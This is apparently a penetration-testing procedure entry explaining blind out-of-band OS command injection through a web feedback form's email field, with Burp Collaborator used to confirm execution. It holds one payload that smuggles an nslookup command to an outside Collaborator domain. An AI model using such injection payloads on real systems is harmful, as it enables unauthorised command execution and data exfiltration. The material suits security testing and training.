---
id: 96e4bdec-a632-42c4-9b77-f9ae08ad564d
name: Blind OS Injection Out Of Band (Burp Collaborator)
type: procedure
verified: true
submitted: true
created_at: '2020-08-08T06:44:14.335190+00:00'
updated_at: '2023-05-26T18:38:25.261896+00:00'
platforms:
- Web
tags:
- '[[injection]]'
- '[[os command injection]]'
- '[[Out of band ]]'
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[Web Applications]]'
---

# Blind OS Injection Out Of Band (Burp Collaborator)

**Status**: ✓ Verified

## Summary

In Blind OS injection out of band, no response can be seen on the application's page. Instead the response is sent to attacker's domain which was sent to the application through untrusted input field.In this case email field is used. 

## Description

# Description

In Blind OS injection out of band, no response can be seen on the application's page. Instead the response is sent to attacker's domain which was sent to the application through untrusted input field.In this case email field is used.

# Instructions

1. Navigate to *submit feedback* page in the application.

2. Open* Burp suite professional *and under burp click on *Burp Collaborator client*

3. A separate window for Burp collaborator client will be opened . Click on copy to clipboard to copy the collaborator domain

4. Intercept the *submit feedback* request using burp .

5. The request being intercepted can be observed .

6. Right Click on the application, select *send to repeater *to send the request to the repeater. Change the email filed value as below.

*Payload : *`email=test%40test||nslookup+ qwq4cmfqw6aof31vv310nzw1xs3lra.burpcollaborator.net||`

7.Observe that request is in *repeater *tab now. Sens the request to server .

8. Under Burp Collaborator client window, click on *poll now  *to observe the DNS requests in bottom  panel. The DNSlookup for collaborator confirms the out of band arbitary command execution of the payload in the email field.

## Platforms

- Web

## Tags

- [[injection]]
- [[os command injection]]
- [[Out of band ]]
- [[owasp]]
- [[owasp top 10]]
- [[Web Applications]]
